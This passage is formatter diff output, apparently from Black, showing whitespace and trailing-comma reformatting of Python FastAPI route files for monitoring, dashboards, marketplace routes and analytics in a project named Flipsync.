-                    "message": f"Slow response time: {metrics.response_time:.1f}s",
-                    "model": metrics.model_name,
-                    "response_time": metrics.response_time
-                })
-        
+                alerts.append(
+                    {
+                        "timestamp": metrics.timestamp,
+                        "type": "error",
+                        "message": f"AI request failed: {metrics.error_message}",
+                        "model": metrics.model_name,
+                        "response_time": metrics.response_time,
+                    }
+                )
+            elif (
+                metrics.response_time
+                >= monitor.alert_thresholds["response_time_critical"]
+            ):
+                alerts.append(
+                    {
+                        "timestamp": metrics.timestamp,
+                        "type": "critical",
+                        "message": f"Critical response time: {metrics.response_time:.1f}s",
+                        "model": metrics.model_name,
+                        "response_time": metrics.response_time,
+                    }
+                )
+            elif (
+                metrics.response_time
+                >= monitor.alert_thresholds["response_time_warning"]
+            ):
+                alerts.append(
+                    {
+                        "timestamp": metrics.timestamp,
+                        "type": "warning",
+                        "message": f"Slow response time: {metrics.response_time:.1f}s",
+                        "model": metrics.model_name,
+                        "response_time": metrics.response_time,
+                    }
+                )
+
         return {
             "alert_thresholds": monitor.alert_thresholds,
             "alerts_enabled": monitor.alerts_enabled,
             "recent_alerts": alerts[-20:],  # Last 20 alerts
-            "alert_count": len(alerts)
-        }
-        
+            "alert_count": len(alerts),
+        }
+
     except Exception as e:
         logger.error(f"Error getting AI alerts: {e}")
         raise HTTPException(status_code=500, detail="Failed to get AI alerts")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/ai_monitoring.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/__init__.py	2025-06-15 22:45:46.244848+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/__init__.py	2025-06-19 04:03:43.380605+00:00
@@ -8,17 +8,19 @@
 from fastapi import APIRouter
 
 # Import marketplace route modules
 try:
     from .ebay import router as ebay_router
+
     EBAY_AVAILABLE = True
 except ImportError as e:
     print(f"eBay marketplace routes not available: {e}")
     EBAY_AVAILABLE = False
 
 try:
     from .amazon import router as amazon_router
+
     AMAZON_AVAILABLE = True
 except ImportError as e:
     print(f"Amazon marketplace routes not available: {e}")
     AMAZON_AVAILABLE = False
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/dashboard.py	2025-06-16 18:22:53.303762+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/dashboard.py	2025-06-19 04:03:43.486336+00:00
@@ -14,21 +14,24 @@
 from fs_agt_clean.core.security.auth import get_current_user
 
 logger = logging.getLogger(__name__)
 
 router = APIRouter(tags=["dashboard"])
+
 
 # OPTIONS handlers for CORS preflight requests
 @router.options("/")
 async def options_dashboards():
     """Handle CORS preflight for dashboards root endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/{dashboard_id}")
 async def options_dashboard(dashboard_id: str):
     """Handle CORS preflight for specific dashboard endpoint."""
     return {"message": "OK"}
+
 
 @router.options("/metrics/{metric_type}")
 async def options_metrics(metric_type: str):
     """Handle CORS preflight for metrics endpoint."""
     return {"message": "OK"}
@@ -133,11 +136,11 @@
         List of available dashboards
     """
     dashboard_service = get_dashboard_service(request)
 
     # Check if this is the real dashboard service or mock
-    if hasattr(dashboard_service, 'list_dashboards'):
+    if hasattr(dashboard_service, "list_dashboards"):
         # Real dashboard service
         return await dashboard_service.list_dashboards()
     else:
         # Mock dashboard service
         return await dashboard_service.get_dashboards()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/dashboard.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/test_ebay.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/test_ebay.py	2025-06-19 04:03:43.699108+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for marketplace_ebay_endpoints
 
 This module contains API/Services focused tests for the migrated marketplace_ebay_endpoints component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from ebay import *
+
 
 class TestEbayAPIServices:
     """API/Services test class for ebay."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/test_ebay.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/enhanced_monitoring.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/enhanced_monitoring.py	2025-06-19 04:03:44.328988+00:00
@@ -13,11 +13,15 @@
 from typing import Dict, List, Optional, Any
 from fastapi import APIRouter, Depends, HTTPException, Query, Request
 from pydantic import BaseModel, Field
 
 from fs_agt_clean.database.models.metrics import (
-    MetricType, MetricCategory, AlertLevel, AlertCategory, AlertSource
+    MetricType,
+    MetricCategory,
+    AlertLevel,
+    AlertCategory,
+    AlertSource,
 )
 from fs_agt_clean.services.monitoring.metrics_service import MetricsService
 from fs_agt_clean.services.monitoring.alert_service import EnhancedAlertService
 
 
@@ -29,65 +33,75 @@
 
 
 # Request/Response Models
 class MetricDataPointRequest(BaseModel):
     """Request model for storing metric data points."""
+
     name: str = Field(..., description="Metric name")
     value: float = Field(..., description="Metric value")
     type: MetricType = Field(MetricType.GAUGE, description="Metric type")
-    category: MetricCategory = Field(MetricCategory.SYSTEM, description="Metric category")
+    category: MetricCategory = Field(
+        MetricCategory.SYSTEM, description="Metric category"
+    )
     labels: Optional[Dict[str, str]] = Field(None, description="Optional labels/tags")
     agent_id: Optional[str] = Field(None, description="Optional agent identifier")
     service_name: Optional[str] = Field(None, description="Optional service name")
 
 
 class AlertRequest(BaseModel):
     """Request model for creating alerts."""
+
     title: str = Field(..., description="Alert title")
     message: str = Field(..., description="Alert message")
     level: AlertLevel = Field(AlertLevel.INFO, description="Alert level")
     category: AlertCategory = Field(AlertCategory.SYSTEM, description="Alert category")
     source: AlertSource = Field(AlertSource.SYSTEM, description="Alert source")
-    details: Optional[Dict[str, Any]] = Field(None, description="Optional alert details")
+    details: Optional[Dict[str, Any]] = Field(
+        None, description="Optional alert details"
+    )
     labels: Optional[Dict[str, str]] = Field(None, description="Optional alert labels")
     correlation_id: Optional[str] = Field(None, description="Optional correlation ID")
 
 
 class AlertAcknowledgeRequest(BaseModel):
     """Request model for acknowledging alerts."""
+
     acknowledged_by: str = Field(..., description="User who acknowledged the alert")
     notes: Optional[str] = Field(None, description="Optional acknowledgment notes")
 
 
 class AlertResolveRequest(BaseModel):
     """Request model for resolving alerts."""
+
     resolved_by: str = Field(..., description="User who resolved the alert")
-    resolution_notes: Optional[str] = Field(None, description="Optional resolution notes")
+    resolution_notes: Optional[str] = Field(
+        None, description="Optional resolution notes"
+    )
 
 
 # Dependency injection helpers
 async def get_metrics_service(request: Request) -> MetricsService:
     """Get metrics service from app state."""
-    database = getattr(request.app.state, 'database', None)
+    database = getattr(request.app.state, "database", None)
     if not database:
         raise HTTPException(status_code=500, detail="Database not available")
     return MetricsService(database)
 
 
 async def get_alert_service(request: Request) -> EnhancedAlertService:
     """Get alert service from app state."""
-    database = getattr(request.app.state, 'database', None)
+    database = getattr(request.app.state, "database", None)
     if not database:
         raise HTTPException(status_code=500, detail="Database not available")
     return EnhancedAlertService(database)
 
 
 # Metrics Endpoints
 @router.post("/metrics/data-points")
 async def store_metric_data_point(
     metric_request: MetricDataPointRequest,
-    metrics_service: MetricsService = Depends(get_metrics_service)
+    metrics_service: MetricsService = Depends(get_metrics_service),
 ) -> Dict[str, str]:
     """Store a metric data point.
 
     Args:
         metric_request: Metric data point request
@@ -102,11 +116,11 @@
             value=metric_request.value,
             metric_type=metric_request.type,
             category=metric_request.category,
             labels=metric_request.labels,
             agent_id=metric_request.agent_id,
-            service_name=metric_request.service_name
+            service_name=metric_request.service_name,
         )
 
         return {"metric_id": metric_id, "status": "stored"}
     except Exception as e:
         logger.error(f"Error storing metric data point: {e}")
@@ -120,11 +134,11 @@
     agent_id: Optional[str] = Query(None, description="Agent ID filter"),
     service_name: Optional[str] = Query(None, description="Service name filter"),
     start_time: Optional[datetime] = Query(None, description="Start time filter"),
     end_time: Optional[datetime] = Query(None, description="End time filter"),
     limit: int = Query(100, description="Maximum number of results"),
-    metrics_service: MetricsService = Depends(get_metrics_service)
+    metrics_service: MetricsService = Depends(get_metrics_service),
 ) -> List[Dict[str, Any]]:
     """Retrieve metric data points with filtering.
 
     Args:
         Various filter parameters
@@ -139,11 +153,11 @@
             category=category,
             agent_id=agent_id,
             service_name=service_name,
             start_time=start_time,
             end_time=end_time,
-            limit=limit
+            limit=limit,
         )
 
         return metrics
     except Exception as e:
         logger.error(f"Error retrieving metric data points: {e}")
@@ -154,11 +168,11 @@
 async def get_system_metrics_history(
     start_time: Optional[datetime] = Query(None, description="Start time filter"),
     end_time: Optional[datetime] = Query(None, description="End time filter"),
     service_name: Optional[str] = Query(None, description="Service name filter"),
     limit: int = Query(100, description="Maximum number of results"),
-    metrics_service: MetricsService = Depends(get_metrics_service)
+    metrics_service: MetricsService = Depends(get_metrics_service),
 ) -> List[Dict[str, Any]]:
     """Retrieve system metrics history.
 
     Args:
         Various filter parameters
@@ -170,11 +184,11 @@
     try:
         metrics = await metrics_service.get_system_metrics_history(
             start_time=start_time,
             end_time=end_time,
             service_name=service_name,
-            limit=limit
+            limit=limit,
         )
 
         return metrics
     except Exception as e:
         logger.error(f"Error retrieving system metrics history: {e}")
@@ -185,11 +199,11 @@
 async def get_agent_metrics_history(
     agent_id: Optional[str] = Query(None, description="Agent ID filter"),
     start_time: Optional[datetime] = Query(None, description="Start time filter"),
     end_time: Optional[datetime] = Query(None, description="End time filter"),
     limit: int = Query(100, description="Maximum number of results"),
-    metrics_service: MetricsService = Depends(get_metrics_service)
+    metrics_service: MetricsService = Depends(get_metrics_service),
 ) -> List[Dict[str, Any]]:
     """Retrieve agent metrics history.
 
     Args:
         Various filter parameters
@@ -198,14 +212,11 @@
     Returns:
         List of agent metrics snapshots
     """
     try:
         metrics = await metrics_service.get_agent_metrics_history(
-            agent_id=agent_id,
-            start_time=start_time,
-            end_time=end_time,
-            limit=limit
+            agent_id=agent_id, start_time=start_time, end_time=end_time, limit=limit
         )
 
         return metrics
     except Exception as e:
         logger.error(f"Error retrieving agent metrics history: {e}")
@@ -214,11 +225,11 @@
 
 @router.get("/metrics/summary")
 async def get_metrics_summary(
     start_time: Optional[datetime] = Query(None, description="Start time filter"),
     end_time: Optional[datetime] = Query(None, description="End time filter"),
-    metrics_service: MetricsService = Depends(get_metrics_service)
+    metrics_service: MetricsService = Depends(get_metrics_service),
 ) -> Dict[str, Any]:
     """Get metrics summary for the specified time period.
 
     Args:
         start_time: Optional start time filter
@@ -228,12 +239,11 @@
     Returns:
         Metrics summary dictionary
     """
     try:
         summary = await metrics_service.get_metrics_summary(
-            start_time=start_time,
-            end_time=end_time
+            start_time=start_time, end_time=end_time
         )
 
         return summary
     except Exception as e:
         logger.error(f"Error retrieving metrics summary: {e}")
@@ -242,11 +252,11 @@
 
 # Alert Endpoints
 @router.post("/alerts")
 async def create_alert(
     alert_request: AlertRequest,
-    alert_service: EnhancedAlertService = Depends(get_alert_service)
+    alert_service: EnhancedAlertService = Depends(get_alert_service),
 ) -> Dict[str, Any]:
     """Create a new alert.
 
     Args:
         alert_request: Alert creation request
@@ -262,11 +272,11 @@
             level=alert_request.level,
             category=alert_request.category,
             source=alert_request.source,
             details=alert_request.details,
             labels=alert_request.labels,
-            correlation_id=alert_request.correlation_id
+            correlation_id=alert_request.correlation_id,
         )
 
         if alert_id:
             return {"alert_id": alert_id, "status": "created"}
         else:
@@ -277,18 +287,20 @@
 
 
 @router.get("/alerts")
 async def get_alerts(
     level: Optional[AlertLevel] = Query(None, description="Alert level filter"),
-    category: Optional[AlertCategory] = Query(None, description="Alert category filter"),
+    category: Optional[AlertCategory] = Query(
+        None, description="Alert category filter"
+    ),
     source: Optional[AlertSource] = Query(None, description="Alert source filter"),
     acknowledged: Optional[bool] = Query(None, description="Acknowledged filter"),
     resolved: Optional[bool] = Query(None, description="Resolved filter"),
     start_time: Optional[datetime] = Query(None, description="Start time filter"),
     end_time: Optional[datetime] = Query(None, description="End time filter"),
     limit: int = Query(100, description="Maximum number of results"),
-    alert_service: EnhancedAlertService = Depends(get_alert_service)
+    alert_service: EnhancedAlertService = Depends(get_alert_service),
 ) -> List[Dict[str, Any]]:
     """Retrieve alerts with filtering.
 
     Args:
         Various filter parameters
@@ -304,11 +316,11 @@
             source=source,
             acknowledged=acknowledged,
             resolved=resolved,
             start_time=start_time,
             end_time=end_time,
-            limit=limit
+            limit=limit,
         )
 
         return alerts
     except Exception as e:
         logger.error(f"Error retrieving alerts: {e}")
@@ -317,11 +329,11 @@
 
 @router.post("/alerts/{alert_id}/acknowledge")
 async def acknowledge_alert(
     alert_id: str,
     acknowledge_request: AlertAcknowledgeRequest,
-    alert_service: EnhancedAlertService = Depends(get_alert_service)
+    alert_service: EnhancedAlertService = Depends(get_alert_service),
 ) -> Dict[str, str]:
     """Acknowledge an alert.
 
     Args:
         alert_id: Alert ID to acknowledge
@@ -333,11 +345,11 @@
     """
     try:
         success = await alert_service.acknowledge_alert(
             alert_id=alert_id,
             acknowledged_by=acknowledge_request.acknowledged_by,
-            notes=acknowledge_request.notes
+            notes=acknowledge_request.notes,
         )
 
         if success:
             return {"status": "acknowledged", "alert_id": alert_id}
         else:
@@ -351,11 +363,11 @@
 
 @router.post("/alerts/{alert_id}/resolve")
 async def resolve_alert(
     alert_id: str,
     resolve_request: AlertResolveRequest,
-    alert_service: EnhancedAlertService = Depends(get_alert_service)
+    alert_service: EnhancedAlertService = Depends(get_alert_service),
 ) -> Dict[str, str]:
     """Resolve an alert.
 
     Args:
         alert_id: Alert ID to resolve
@@ -367,11 +379,11 @@
     """
     try:
         success = await alert_service.resolve_alert(
             alert_id=alert_id,
             resolved_by=resolve_request.resolved_by,
-            resolution_notes=resolve_request.resolution_notes
+            resolution_notes=resolve_request.resolution_notes,
         )
 
         if success:
             return {"status": "resolved", "alert_id": alert_id}
         else:
@@ -385,11 +397,11 @@
 
 @router.get("/alerts/summary")
 async def get_alert_summary(
     start_time: Optional[datetime] = Query(None, description="Start time filter"),
     end_time: Optional[datetime] = Query(None, description="End time filter"),
-    alert_service: EnhancedAlertService = Depends(get_alert_service)
+    alert_service: EnhancedAlertService = Depends(get_alert_service),
 ) -> Dict[str, Any]:
     """Get alert summary statistics.
 
     Args:
         start_time: Optional start time filter
@@ -399,12 +411,11 @@
     Returns:
         Alert summary dictionary
     """
     try:
         summary = await alert_service.get_alert_summary(
-            start_time=start_time,
-            end_time=end_time
+            start_time=start_time, end_time=end_time
         )
 
         return summary
     except Exception as e:
         logger.error(f"Error retrieving alert summary: {e}")
@@ -415,11 +426,11 @@
 @router.get("/dashboard/overview")
 async def get_dashboard_overview(
     start_time: Optional[datetime] = Query(None, description="Start time filter"),
     end_time: Optional[datetime] = Query(None, description="End time filter"),
     metrics_service: MetricsService = Depends(get_metrics_service),
-    alert_service: EnhancedAlertService = Depends(get_alert_service)
+    alert_service: EnhancedAlertService = Depends(get_alert_service),
 ) -> Dict[str, Any]:
     """Get dashboard overview with metrics and alerts summary.
 
     Args:
         start_time: Optional start time filter
@@ -431,39 +442,33 @@
         Dashboard overview dictionary
     """
     try:
         # Get metrics summary
         metrics_summary = await metrics_service.get_metrics_summary(
-            start_time=start_time,
-            end_time=end_time
+            start_time=start_time, end_time=end_time
         )
 
         # Get alert summary
         alert_summary = await alert_service.get_alert_summary(
-            start_time=start_time,
-            end_time=end_time
+            start_time=start_time, end_time=end_time
         )
 
         # Get recent system metrics
         recent_system_metrics = await metrics_service.get_system_metrics_history(
-            start_time=start_time,
-            end_time=end_time,
-            limit=10
+            start_time=start_time, end_time=end_time, limit=10
         )
 
         # Get recent alerts
         recent_alerts = await alert_service.get_alerts(
-            start_time=start_time,
-            end_time=end_time,
-            limit=10
+            start_time=start_time, end_time=end_time, limit=10
         )
 
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "metrics_summary": metrics_summary,
             "alert_summary": alert_summary,
             "recent_system_metrics": recent_system_metrics,
-            "recent_alerts": recent_alerts
+            "recent_alerts": recent_alerts,
         }
     except Exception as e:
         logger.error(f"Error retrieving dashboard overview: {e}")
         raise HTTPException(status_code=500, detail=str(e))
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/enhanced_monitoring.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/analytics.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/analytics.py	2025-06-19 04:03:44.340749+00:00
@@ -24,10 +24,11 @@
 router = APIRouter(
     tags=["analytics"],
     responses={404: {"description": "Not found"}},
 )
 
+
 # Get analytics service instance
 async def get_analytics_service() -> AnalyticsService:
     """Get the analytics service instance."""
     config_manager = get_config_manager()
     log_manager = LogManager()
@@ -36,11 +37,11 @@
 
 @router.post("/performance-metrics", response_model=PerformanceMetricsResponse)
 async def get_performance_metrics(
     request: PerformanceMetricsRequest,
     current_user: User = Depends(get_current_user),
-    analytics_service: AnalyticsService = Depends(get_analytics_service)
+    analytics_service: AnalyticsService = Depends(get_analytics_service),
 ):
     """
     Get performance metrics for listings across marketplaces.
 
     This endpoint provides detailed performance metrics for listings,
@@ -49,11 +50,11 @@
     try:
         # Get metrics from analytics service
         metrics = await analytics_service.get_metrics(
             category="performance",
             start_time=request.time_period.start_date,
-            end_time=request.time_period.end_date
+            end_time=request.time_period.end_date,
         )
 
         # Process metrics into the required format
         total_views = 0
         unique_visitors = 0
@@ -79,11 +80,11 @@
                 if marketplace not in marketplace_breakdown:
                     marketplace_breakdown[marketplace] = {
                         "views": 0,
                         "conversion_rate": 0,
                         "sales": 0,
-                        "revenue": 0
+                        "revenue": 0,
                     }
 
                 if point.name == "views":
                     marketplace_breakdown[marketplace]["views"] += point.value
                 elif point.name == "sales":
@@ -106,28 +107,32 @@
                         elif point.name == "revenue":
                             product["revenue"] += point.value
                         break
 
                 if not product_exists and len(top_products) < 10:
-                    top_products.append({
-                        "product_id": product_id,
-                        "title": product_title,
-                        "views": point.value if point.name == "views" else 0,
-                        "conversion_rate": 0,
-                        "sales": point.value if point.name == "sales" else 0,
-                        "revenue": point.value if point.name == "revenue" else 0
-                    })
+                    top_products.append(
+                        {
+                            "product_id": product_id,
+                            "title": product_title,
+                            "views": point.value if point.name == "views" else 0,
+                            "conversion_rate": 0,
+                            "sales": point.value if point.name == "sales" else 0,
+                            "revenue": point.value if point.name == "revenue" else 0,
+                        }
+                    )
 
         # Calculate derived metrics
         conversion_rate = (total_sales / total_views * 100) if total_views > 0 else 0
         average_order_value = (total_revenue / total_sales) if total_sales > 0 else 0
 
         # Calculate conversion rates for marketplaces
         for marketplace in marketplace_breakdown:
             views = marketplace_breakdown[marketplace]["views"]
             sales = marketplace_breakdown[marketplace]["sales"]
-            marketplace_breakdown[marketplace]["conversion_rate"] = (sales / views * 100) if views > 0 else 0
+            marketplace_breakdown[marketplace]["conversion_rate"] = (
+                (sales / views * 100) if views > 0 else 0
+            )
 
         # Calculate conversion rates for products
         for product in top_products:
             views = product["views"]
             sales = product["sales"]
@@ -153,19 +158,19 @@
             created_at=datetime.now(),
         )
     except Exception as e:
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to get performance metrics: {str(e)}"
+            detail=f"Failed to get performance metrics: {str(e)}",
         )
 
 
 @router.post("/sales-report", response_model=SalesReportResponse)
 async def generate_sales_report(
     request: SalesReportRequest,
     current_user: User = Depends(get_current_user),
-    analytics_service: AnalyticsService = Depends(get_analytics_service)
+    analytics_service: AnalyticsService = Depends(get_analytics_service),
 ):
     """
     Generate a comprehensive sales report.
 
     This endpoint generates detailed sales reports with filtering by
@@ -174,19 +179,23 @@
     try:
         # Get metrics from analytics service with filters
         filters = {}
         if request.filters:
             if request.filters.marketplace_ids:
-                filters["marketplace_id"] = request.filters.marketplace_ids[0]  # Use first for simplicity
+                filters["marketplace_id"] = request.filters.marketplace_ids[
+                    0
+                ]  # Use first for simplicity
             if request.filters.category_ids:
-                filters["category_id"] = request.filters.category_ids[0]  # Use first for simplicity
+                filters["category_id"] = request.filters.category_ids[
+                    0
+                ]  # Use first for simplicity
 
         # Get sales metrics
         metrics = await analytics_service.get_metrics(
             category="sales",
             start_time=request.time_period.start_date,
-            end_time=request.time_period.end_date
+            end_time=request.time_period.end_date,
         )
 
         # Process metrics into the required format
         total_sales = 0
         total_revenue = 0
@@ -209,11 +218,11 @@
             if marketplace:
                 if marketplace not in sales_by_marketplace:
                     sales_by_marketplace[marketplace] = {
                         "sales": 0,
                         "revenue": 0,
-                        "profit": 0
+                        "profit": 0,
                     }
 
                 if point.name == "sales":
                     sales_by_marketplace[marketplace]["sales"] += point.value
                 elif point.name == "revenue":
@@ -226,11 +235,11 @@
             if category:
                 if category not in sales_by_category:
                     sales_by_category[category] = {
                         "sales": 0,
                         "revenue": 0,
-                        "profit": 0
+                        "profit": 0,
                     }
 
                 if point.name == "sales":
                     sales_by_category[category]["sales"] += point.value
                 elif point.name == "revenue":
@@ -253,17 +262,19 @@
                         elif point.name == "profit":
                             product["profit"] += point.value
                         break
 
                 if not product_exists and len(top_products) < 10:
-                    top_products.append({
-                        "product_id": product_id,
-                        "title": product_title,
-                        "sales": point.value if point.name == "sales" else 0,
-                        "revenue": point.value if point.name == "revenue" else 0,
-                        "profit": point.value if point.name == "profit" else 0
-                    })
+                    top_products.append(
+                        {
+                            "product_id": product_id,
+                            "title": product_title,
+                            "sales": point.value if point.name == "sales" else 0,
+                            "revenue": point.value if point.name == "revenue" else 0,
+                            "profit": point.value if point.name == "profit" else 0,
+                        }
+                    )
 
         # Calculate derived metrics
         profit_margin = (total_profit / total_revenue * 100) if total_revenue > 0 else 0
         average_order_value = (total_revenue / total_sales) if total_sales > 0 else 0
 
@@ -293,19 +304,19 @@
             created_at=datetime.now(),
         )
     except Exception as e:
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to generate sales report: {str(e)}"
+            detail=f"Failed to generate sales report: {str(e)}",
         )
 
 
 @router.post("/marketplace-comparison", response_model=MarketplaceComparisonResponse)
 async def compare_marketplaces(
     request: MarketplaceComparisonRequest,
     current_user: User = Depends(get_current_user),
-    analytics_service: AnalyticsService = Depends(get_analytics_service)
+    analytics_service: AnalyticsService = Depends(get_analytics_service),
 ):
     """
     Compare performance across different marketplaces.
 
     This endpoint provides comparative analysis of product performance
@@ -317,11 +328,11 @@
         for marketplace in request.marketplaces:
             metrics = await analytics_service.get_metrics(
                 category="marketplace",
                 start_time=request.time_period.start_date,
                 end_time=request.time_period.end_date,
-                filters={"marketplace": marketplace}
+                filters={"marketplace": marketplace},
             )
             marketplace_metrics[marketplace] = metrics
 
         # Process metrics into the required format
         sales_volume = {}
@@ -358,17 +369,19 @@
                 if category:
                     if category not in category_data:
                         category_data[category] = {
                             "best_performing": "",
                             "sales_volume": {},
-                            "revenue": {}
+                            "revenue": {},
                         }
 
                     if point.name == "sales":
                         if marketplace not in category_data[category]["sales_volume"]:
                             category_data[category]["sales_volume"][marketplace] = 0
-                        category_data[category]["sales_volume"][marketplace] += point.value
+                        category_data[category]["sales_volume"][
+                            marketplace
+                        ] += point.value
                     elif point.name == "revenue":
                         if marketplace not in category_data[category]["revenue"]:
                             category_data[category]["revenue"][marketplace] = 0
                         category_data[category]["revenue"][marketplace] += point.value
 
@@ -381,42 +394,61 @@
                             "product_id": product_id,
                             "title": product_title,
                             "best_performing": "",
                             "sales": {},
                             "revenue": {},
-                            "conversion_rate": {}
+                            "conversion_rate": {},
                         }
 
                     if point.name == "sales":
                         product_data[product_id]["sales"][marketplace] = point.value
                     elif point.name == "revenue":
                         product_data[product_id]["revenue"][marketplace] = point.value
-                    elif point.name == "conversions" and product_id in product_data and "sales" in product_data[product_id] and marketplace in product_data[product_id]["sales"]:
+                    elif (
+                        point.name == "conversions"
+                        and product_id in product_data
+                        and "sales" in product_data[product_id]
+                        and marketplace in product_data[product_id]["sales"]
+                    ):
                         sales = product_data[product_id]["sales"][marketplace]
-                        product_data[product_id]["conversion_rate"][marketplace] = (point.value / sales * 100) if sales > 0 else 0
+                        product_data[product_id]["conversion_rate"][marketplace] = (
+                            (point.value / sales * 100) if sales > 0 else 0
+                        )
 
             # Store aggregated data for the marketplace
             sales_volume[marketplace] = total_sales
             revenue[marketplace] = total_revenue
-            profit_margin = (total_profit / total_revenue * 100) if total_revenue > 0 else 0
+            profit_margin = (
+                (total_profit / total_revenue * 100) if total_revenue > 0 else 0
+            )
             profit[marketplace] = profit_margin
-            conversion_rate[marketplace] = (total_conversions / total_sales * 100) if total_sales > 0 else 0
-            average_price[marketplace] = (total_revenue / total_sales) if total_sales > 0 else 0
+            conversion_rate[marketplace] = (
+                (total_conversions / total_sales * 100) if total_sales > 0 else 0
+            )
+            average_price[marketplace] = (
+                (total_revenue / total_sales) if total_sales > 0 else 0
+            )
 
         # Determine best performing marketplace overall
-        best_marketplace = max(revenue.items(), key=lambda x: x[1])[0] if revenue else ""
+        best_marketplace = (
+            max(revenue.items(), key=lambda x: x[1])[0] if revenue else ""
+        )
 
         # Determine best performing marketplace for each category
         for category in category_data:
             if category_data[category]["revenue"]:
-                best_category_marketplace = max(category_data[category]["revenue"].items(), key=lambda x: x[1])[0]
+                best_category_marketplace = max(
+                    category_data[category]["revenue"].items(), key=lambda x: x[1]
+                )[0]
                 category_data[category]["best_performing"] = best_category_marketplace
 
         # Determine best performing marketplace for each product
         for product_id, product in product_data.items():
             if product["revenue"]:
-                best_product_marketplace = max(product["revenue"].items(), key=lambda x: x[1])[0]
+                best_product_marketplace = max(
+                    product["revenue"].items(), key=lambda x: x[1]
+                )[0]
                 product["best_performing"] = best_product_marketplace
 
         # Convert product_data dictionary to list and sort by revenue
         product_comparison = list(product_data.values())
         product_comparison.sort(key=lambda x: sum(x["revenue"].values()), reverse=True)
@@ -426,22 +458,28 @@
 
         # Add category-based recommendations
         for category, data in category_data.items():
             best = data["best_performing"]
             if best:
-                recommendations.append(f"Focus {category} listings on {best} for better performance")
+                recommendations.append(
+                    f"Focus {category} listings on {best} for better performance"
+                )
 
         # Add general recommendations based on conversion rates
         if conversion_rate:
             best_conversion = max(conversion_rate.items(), key=lambda x: x[1])[0]
-            recommendations.append(f"Optimize listings for {best_conversion} to improve conversion rates")
+            recommendations.append(
+                f"Optimize listings for {best_conversion} to improve conversion rates"
+            )
 
         # Add pricing recommendations
         if average_price:
             best_price = max(average_price.items(), key=lambda x: x[1])[0]
             worst_price = min(average_price.items(), key=lambda x: x[1])[0]
-            recommendations.append(f"Consider adjusting pricing strategy on {worst_price} to increase average selling price")
+            recommendations.append(
+                f"Consider adjusting pricing strategy on {worst_price} to increase average selling price"
+            )
 
         # Limit to 4 recommendations
         recommendations = recommendations[:4]
 
         return MarketplaceComparisonResponse(
@@ -462,11 +500,11 @@
             created_at=datetime.now(),
         )
     except Exception as e:
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to compare marketplaces: {str(e)}"
+            detail=f"Failed to compare marketplaces: {str(e)}",
         )
 
 
 @router.get("/dashboard")
 async def get_dashboard():
@@ -477,22 +515,23 @@
         "status": "ok",
         "analytics": {
             "total_sales": 1250,
             "total_revenue": 45000.00,
             "conversion_rate": 3.2,
-            "active_listings": 89
+            "active_listings": 89,
         },
-        "timestamp": datetime.now().isoformat()
+        "timestamp": datetime.now().isoformat(),
     }
+
 
 @router.get("/dashboard-data", response_model=Dict)
 async def get_dashboard_data(
     time_period: str = Query(
         "last_30_days", description="Time period for dashboard data"
     ),
     current_user: User = Depends(get_current_user),
-    analytics_service: AnalyticsService = Depends(get_analytics_service)
+    analytics_service: AnalyticsService = Depends(get_analytics_service),
 ):
     """
     Get data for the analytics dashboard.
 
     This endpoint provides summary data for the analytics dashboard,
@@ -515,13 +554,11 @@
             # Default to last 30 days
             start_date = end_date - timedelta(days=30)
 
         # Get dashboard metrics
         metrics = await analytics_service.get_metrics(
-            category="dashboard",
-            start_time=start_date,
-            end_time=end_date
+            category="dashboard", start_time=start_date, end_time=end_date
         )
 
         # Process metrics for dashboard
         dashboard_data = {
             "summary": {
@@ -551,14 +588,16 @@
                 dashboard_data["summary"]["total_orders"] += point.value
 
         # Calculate conversion rate
         if dashboard_data["summary"]["total_orders"] > 0:
             dashboard_data["summary"]["conversion_rate"] = (
-                dashboard_data["summary"]["total_sales"] / dashboard_data["summary"]["total_orders"] * 100
+                dashboard_data["summary"]["total_sales"]
+                / dashboard_data["summary"]["total_orders"]
+                * 100
             )
 
         return dashboard_data
     except Exception as e:
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to get dashboard data: {str(e)}"
-        )
+            detail=f"Failed to get dashboard data: {str(e)}",
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/analytics.py
